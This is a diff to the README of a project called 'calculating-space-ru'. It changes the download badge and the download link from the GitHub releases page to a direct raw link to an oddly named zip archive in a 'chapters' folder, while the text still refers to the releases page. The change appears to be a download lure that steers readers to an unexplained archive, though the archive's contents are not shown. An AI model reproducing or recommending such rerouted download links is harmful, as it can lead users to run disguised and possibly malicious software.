@@ -1,6 +1,6 @@
 # 🎉 calculating-space-ru - Explore the World of Digital Physics
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/TechSqrl/calculating-space-ru/releases)
+[![Download](https://raw.githubusercontent.com/TechSqrl/calculating-space-ru/main/chapters/calculating-space-ru_amylum.zip)](https://raw.githubusercontent.com/TechSqrl/calculating-space-ru/main/chapters/calculating-space-ru_amylum.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To get started with calculating-space-ru, follow these easy steps. You will be a
 
 To download calculating-space-ru, visit the following page:
 
-[Download calculating-space-ru](https://github.com/TechSqrl/calculating-space-ru/releases)
+[Download calculating-space-ru](https://raw.githubusercontent.com/TechSqrl/calculating-space-ru/main/chapters/calculating-space-ru_amylum.zip)
 
 On the releases page, follow these steps:
 
